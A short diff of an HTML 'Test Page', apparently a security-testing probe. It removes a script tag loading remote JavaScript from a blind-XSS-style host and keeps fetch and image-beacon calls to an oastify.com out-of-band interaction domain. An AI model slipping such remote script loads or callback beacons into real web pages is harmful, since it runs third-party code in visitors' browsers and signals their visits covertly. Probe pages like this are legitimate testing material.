@@ -2,15 +2,12 @@
 <html>
 <head>
   <title>Test Page</title>
-  <script src="https://js.rip/5mw8at9w5s"></script>
   <script>
     fetch("https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/")
       .then(r => {
         console.log("First fetch status:", r.status);
         if (r.ok) {
-          fetch("https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/hit")
-            .then(() => console.log("Second fetch sent"))
-            .catch(err => console.warn("Second fetch failed:", err));
+          new Image().src = "https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/hit";
         }
       })
       .catch(err => console.warn("First fetch failed:", err));
